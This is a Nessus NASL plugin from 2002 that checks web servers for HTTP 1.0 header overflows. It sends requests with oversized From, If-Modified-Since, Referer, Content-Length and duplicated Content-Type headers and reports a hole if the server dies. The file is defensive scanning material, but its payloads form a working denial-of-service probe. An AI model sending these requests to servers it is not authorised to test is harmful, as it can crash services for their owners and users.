#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# I don't even know if it crashes any web server...
# 
# Cf. RFC 1945
# 
# Other references:
# 
# From: "at4r" <at4r@hotmail.com>
# Subject: IIS Vulnerability Content-Type overflow
# To: <vuln-dev@securityfocus.com>
# Date: Mon, 2 Dec 2002 23:31:27 +0100
# Reply-To: "at4r" <at4r@3wdesign.es>
# 
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600
#

if(description)
{
 script_id(11127);
 script_version ("$Revision: 1.15 $");
 name["english"] = "HTTP 1.0 header overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with a too long header
(From, If-Modified-Since, Referer or Content-Type)

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbitrary code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long HTTP 1.0 header kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
r1 = http_get(item:"/", port:port);
r1 = r1 - string("\r\n\r\n");
r1 = r1 + string("\r\n");
#
r = string(r1, "From: ", crap(1024), "@", crap(1024), ".org\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#
soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

r = string(r1, "If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ", 
	crap(data: "GMT", length: 1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#
soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

r = string(r1, "Referer: http://", crap(4096), "/\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#

soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

r = string(r1, "Referer: http://", get_host_name(), "/", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#

soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

r = string(r1, "Content-Length: ", crap(4096, data: "123456789"), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#
soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

# Note that the message on VULN-DEV did not say that it was possible to
# *crash* IIS. I put it here just in case...

r = string(r1, "Content-Type: application/x-www-form-urlencoded\r\n",
	"Content-Length: 56\r\n",
	# Yes, Content-Type appears twice!
	"Accept-Language: en", 
	"Content-Type:", crap(32769), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);

#

if (http_is_dead(port: port)) {  security_hole(port); exit(0); }
